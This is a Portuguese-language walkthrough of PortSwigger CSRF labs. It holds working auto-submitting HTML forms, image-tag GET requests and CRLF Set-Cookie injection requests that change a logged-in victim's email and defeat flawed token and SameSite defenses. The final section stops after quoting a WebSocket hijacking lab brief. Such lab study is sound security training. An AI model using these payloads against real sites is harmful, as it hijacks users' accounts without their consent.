---
title: "PortSwigger - CSRF"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de CSRF da PortSwigger"
keywords: ["PortSwigger", "CSRF", "Cross-Site Request Forgery", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: CSRF vulnerability with no defenses
" This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter "

Interceptamos a requisição de mudança de email e observamos que não há nenhum parâmetro do request que seja imprevisível.
Payload final:
```html
<form id="autosubmit" action="http://0aaf00ea032c04ba803d03740011002a.web-security-academy.net/my-account/change-email" enctype="text/plain" method="POST">
 <input name="email" type="hidden" value="hello@gmail.com" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

## Lab: CSRF where token validation depends on request method
" This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter"
Interceptamos a requisição de mudança de email. 
O método utilizado é POST com os parâmetros `email` e `csrf`. 
No usuário que temos acesso "wiener", modificamos o tipo de requisição para GET e retiramos o parâmetro `csrf`. Com essa requisição GET conseguimos modificar o email sem precisar do token `csrf`.  
Página HTML maliciosa que explora essa vulnerabilidade:
```html
<img src="https://0a81009f03453e25823c0b9f000200f9.web-security-academy.net/my-account/change-email?email=hello@email.com">
```

## Lab: CSRF where token validation depends on token being present
" This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter "

Interceptamos a requisição de mudança de email do usuário que temos controle (wiener). 
Retiramos o token `csrf` dos parâmetros. 
Mesmo sem o token conseguimos mudar o email do usuário. 
Página HTML maliciosa que explora essa vulnerabilidade:
```html
<form id="autosubmit" action="https://0ab50038048828e281bb933c00a7000c.web-security-academy.net/my-account/change-email" enctype="text/plain" method="POST">
 <input name="email" type="hidden" value="hello@gmail.com" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

## Lab: CSRF where token is not tied to user session
" This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya
"

Inspecionamos o código fonte da página do usuário `/my-account?id=wiener`. Coletamos o valor presente no parâmetro `csrf`. 
```HTML
<input required type="hidden" name="csrf" value="TXz0RUN12elQmG0d1FHbNvuL0x78HLB1">
```
Na conta do usuário "carlos", interceptamos a requisição de mudança de email e trocamos o valor do parâmetro `csrf` por aquele coletado na página de "wiener". Mesmo com o valor `csrf` de outro usuário, conseguimos mudar o email de carlos.
Página HTML maliciosa que explora essa vulnerabilidade:

```html
<form id="autosubmit" action="https://0a1700620303a7d3802d031d009d0029.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" type="hidden" value="garoto@gmail.com" />
  <input name="csrf" type="hidden" value="TXz0RUN12elQmG0d1FHbNvuL0x78HLB1" />
</form>

<script>
  document.getElementById("autosubmit").submit();
</script>
```

## Lab: CSRF where token is tied to non-session cookie
" This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya
"

```
GET /?search=search%0d%0aSet-Cookie:+csrf=batata%3b+SameSite=None 
```

Then Change the email with the corresponding valid csrf cookie and parameter from the user wiener:
```html
<form id="autosubmit" action="https://0ada00a504cd2a7680a795c7003200cd.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" type="hidden" value="abcd@gmail.com" />
  <input name="csrf" type="hidden" value="j0mP7wEvZRNSHhrxcrWnyQfFtOKR2uqT" />
</form>
<img id="cookieSetter" src="https://0ada00a504cd2a7680a795c7003200cd.web-security-academy.net/?search=item%0d%0aSet-Cookie:+csrfKey=MwXjBDtPgsMHWW1jsGfz79L8sOqKPTUv%3b%20SameSite=None">

<script>
document.getElementById("autosubmit").submit()
</script>
```


## Lab: CSRF where token is duplicated in cookie
" This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter "

Interceptamos a requisição de `/` e observamos que a resposta contém a linha: 
```
Set-Cookie: session=RR6rFKaMoI5AP7sCCbgQVBgBS37WxJJ4; Secure; HttpOnly; SameSite=None
```
Podemos colocar essa linha no cabeçalho do host malicioso.

Na funcionalidade de busca, observamos que na resposta o input do usuário é posto em um parâmetro de Set-Cookie. Se não houver sanitização apropriada do input do usuário, podemos explorar com a requisição:
```
GET /?search=item%0d%0aSet-Cookie:+csrf=batata%3b%20SameSite=None
```
Quando observamos próximas requisições no Burp vemos que o csrf foi atualizado para `batata`.
Assim, o payload final do host malicioso deverá fazer uma requisição para a funcionalidade de busca modificando o `csrf` da vítima e enviar a requisição de mudança de email:
```html
<form id="autosubmit" action="https://0a8700c8031b230880375dae000500d7.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" type="hidden" value="baby@gmail.com" />
  <input name="csrf" type="hidden" value="batata" />
</form>
<img id="cookieSetter" src="https://0a8700c8031b230880375dae000500d7.web-security-academy.net/?search=item%0d%0aSet-Cookie:+csrf=batata%3b%20SameSite=None">

<script>
document.getElementById("autosubmit").submit()
</script>
```

## Lab: SameSite Lax bypass via method override
"This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: wiener:peter"

1. Intercepte a requisição POST de login e observe o seguinte header da resposta:
```
Set-Cookie: session=XDsIOhD4Sjo2bhh40B9dq3AMQFHF4LZ2; Expires=Wed, 08 Oct 2025 00:19:23 UTC; Secure; HttpOnly
```
Isso indica que a política de `SameSite` utilizada é a padrão do Chrome, Lax.
2. Intercepte a requisição de login com o usuário `wiener`, modifique o tipo de requisição para `GET` e adicione o parâmetro `_method` com valor "POST". Com isso, veja que é possível modificar o email com  a requisição `GET`.
3. Com os passos anteriores, foi detectada a possibilidade de explorar a mudança de email por conta do uso da politica Lax, que possibilita requisições cross-site, com a restrição de que seja uma requisição `GET`.
4. Assim, entregando a seguinte página maliciosa para a vítima, o e-mail é trocado:
```html
<html>
  <body>
    <form action="https://<id>.web-security-academy.net/my-account/change-email">
<input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="new&#64;email&#46;com">
      <input type="submit" value="Submit request">
    </form>
    <script>
      history.pushState('', '', '/');
     document.forms[0].submit()
    </script>
  </body>
</html>
```
Considerando que pela restrição Lax, é necessário que a ação seja top level navigation, que é cumprida pela página do exploit.

## Lab: SameSite Strict bypass via client-side redirect
"This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: wiener:peter "

1. Intercepte a requisição de postar comentário: `/post/comment`, envie para o Burp Repeater.
2. Envie a requisição e você será redirecionado para `/post/comment/confirmation?postId=<postId>`. 
3. Analise o código fonte e veja que existe uma parte de `<script>`, com a chamada de função `redirectOnConfirmation('/post');` que vem da fonte: `/resources/js/commentConfirmationRedirect.js`.
4. Faça requisição para o arquivo javascript do passo anterior. Exite um Dom sink nesse código, que no HTML da resposta é redirecionado por um `<a href=...>` depois de 3 segundos.
```javascript
const url = new URL(window.location);
const postId = url.searchParams.get("postId");
window.location = blogPath + '/' + postId;
```
5. Com isso, a seguinte requisição resulta na mudança de email on-site: 
```
GET /post/comment/confirmation?postId=../my-account/change-email?email=example%40email.com%26submit=1
```
6. No exploit server, entregue a seguinte página para a vítima:
```html
<form action="https://<id>.web-security-academy.net/post/comment/confirmation">
<input type="hidden" name="postId" value="&#46;&#46;&#47;my&#45;account&#47;change&#45;email&#63;email&#61;new&#64;email&#46;com&amp;submit&#61;1" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
```

## Lab: SameSite Strict bypass via sibling domain
"This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.
To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.
If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab. "
